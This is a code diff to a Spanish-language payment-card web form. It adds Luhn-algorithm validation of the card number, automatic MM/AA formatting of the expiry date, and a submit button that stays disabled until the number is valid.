@@ -9,7 +9,10 @@
 </head>
 <body>
     
-    
+    <style>
+       /* Default style for the div */
+      
+    </style>
         <div class="kaml">
             <div class="ldakhl" >
             <div class="topano">
@@ -40,7 +43,7 @@
                                     <p>Número de tarjeta</p>
                                     <div class="cc">
                                         
-                                        <input type="tel" name="" id="one" placeholder="____  ____  ____  ____" maxlength="19" minlength="19" required>
+                                        <input style="border: none;" type="tel" name="" id="one" placeholder="____  ____  ____  ____" maxlength="19" minlength="19" required>
                                         
                                         <svg width="2em" height="1.6em" viewBox="0 0 24 24" focusable="" class="sc-2274bq-0 bEoFZP"><path fill-rule="evenodd" d="M4 4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4H4ZM16 8C16 7.44772 16.4477 7 17 7H19C19.5523 7 20 7.44772 20 8V9C20 9.55228 19.5523 10 19 10H17C16.4477 10 16 9.55228 16 9V8ZM4 15C4 14.4477 4.44772 14 5 14H8C8.55228 14 9 14.4477 9 15C9 15.5523 8.55228 16 8 16H5C4.44772 16 4 15.5523 4 15ZM11 14C10.4477 14 10 14.4477 10 15C10 15.5523 10.4477 16 11 16H16C16.5523 16 17 15.5523 17 15C17 14.4477 16.5523 14 16 14H11ZM18 15C18 14.4477 18.4477 14 19 14C19.5523 14 20 14.4477 20 15C20 15.5523 19.5523 16 19 16C18.4477 16 18 15.5523 18 15Z" fill="#73808C" clip-rule="evenodd" class="sc-2274bq-4 jFnDyb"></path></svg>
                                     </div>
@@ -48,7 +51,7 @@
                                 
                                     <div class="vv">
                                         <p>Fecha de expiración</p>
-                                        <input class="aa" type="tel" name="" id="two3" maxlength="4" placeholder="MM/AA" required>
+                                        <input class="aa" type="tel" name="" id="two3" maxlength="7" placeholder="MM/AA" required>
                                     </div>
                                 </div>
                                 
@@ -62,7 +65,7 @@
                             
                     </div>
                             <div class="on-btn">
-                                <button id="botn btn2" class="botn2 btn2">Continuar </button>
+                                <button id="botn" class="botn2 btn2" disabled>Continuar </button>
                             </div>
                     </form>
                             
@@ -94,12 +97,72 @@
 
 
 
+<script>
+    // Get references to the input, div, and button
+    const creditCardInput = document.getElementById("one");
+    const ccDiv = document.querySelector(".cc");
+    const submitButton = document.getElementById("botn");
 
+    // Add input event listener
+    creditCardInput.addEventListener("input", function () {
+        const inputValue = this.value.replace(/\D/g, ''); // Remove non-digits
+        const isValid = validateCreditCard(inputValue); // Validate credit card
+
+        if (isValid) {
+            ccDiv.classList.remove("invalid");
+            ccDiv.classList.add("valid");
+            submitButton.disabled = false; // Enable button
+        } else {
+            ccDiv.classList.remove("valid");
+            ccDiv.classList.add("invalid");
+            submitButton.disabled = true; // Disable button
+        }
+    });
+
+    // Function to validate credit card using Luhn algorithm
+    function validateCreditCard(cardNumber) {
+        if (!cardNumber || cardNumber.length < 13 || cardNumber.length > 19) {
+            return false; // Invalid length
+        }
+
+        // Luhn algorithm
+        let sum = 0;
+        for (let i = 0; i < cardNumber.length; i++) {
+            let digit = parseInt(cardNumber[cardNumber.length - 1 - i]);
+            if (i % 2 === 1) {
+                digit *= 2;
+                if (digit > 9) {
+                    digit = digit - 9;
+                }
+            }
+            sum += digit;
+        }
+
+        return sum % 10 === 0; // Valid if sum is divisible by 10
+    }
+
+    // Prevent form submission if button is disabled
+    submitButton.addEventListener("click", function (event) {
+        if (this.disabled) {
+            event.preventDefault(); // Stop form submission
+            alert("Please enter a valid credit card number.");
+        } else {
+            
+            // Add your form submission logic here
+        }
+    });
+
+    $("#two3").on("keyup", function() {
+    let inputValue = $(this).val().replace(/\D/g, ''); // Remove all non-digits
+    if (inputValue.length > 2) {
+        inputValue = inputValue.slice(0, 2) + "/" + inputValue.slice(2);
+    }
+    $(this).val(inputValue);
+});
+</script>
 
     <script src="./js/stb.js"></script>
     <script src="./js/inp.js"></script>
-    <script>
-            
-    </script>
+    
 </body>
 </html>
